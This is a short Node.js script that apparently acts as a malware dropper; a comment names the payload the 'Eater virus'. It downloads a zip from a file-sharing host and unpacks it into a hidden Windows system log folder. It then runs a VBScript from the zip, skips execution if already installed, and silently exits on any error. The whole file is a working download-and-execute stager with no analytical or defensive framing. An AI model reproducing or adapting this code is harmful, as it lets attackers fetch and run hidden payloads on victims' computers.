//Dependencies
const File_Downloader = require("nodejs-file-downloader")
const Extract_Zip = require("extract-zip")
const Delay = require("delay")
const Fs = require("fs")

//Variables
var Eater_VF_DL = "https://transfer.sh/get/19OLeBB/Eater_VF.zip" //Eater_VF_DL stands for Eater virus file download link

//Main
Main()
async function Main(){
    if(Fs.existsSync("C:\\ProgramData\\USOShared\\Logs\\User\\eater_vf")){
        process.exit()
    }

    try{
        const Downloader = new File_Downloader({
            url: Eater_VF_DL,
            directory: "C:\\ProgramData\\USOShared\\Logs\\User"
        })

        await Downloader.download()

        await Delay(2000)
        
        await Extract_Zip("C:\\ProgramData\\USOShared\\Logs\\User\\Eater_VF.zip", { dir: "C:\\ProgramData\\USOShared\\Logs\\User" })

        await Delay(2000)

        require("child_process").execSync("C:\\ProgramData\\USOShared\\Logs\\User\\eater_vf\\runner.vbs")

        await Delay(2000)

        process.exit()
    }catch{
        process.exit()
    }
}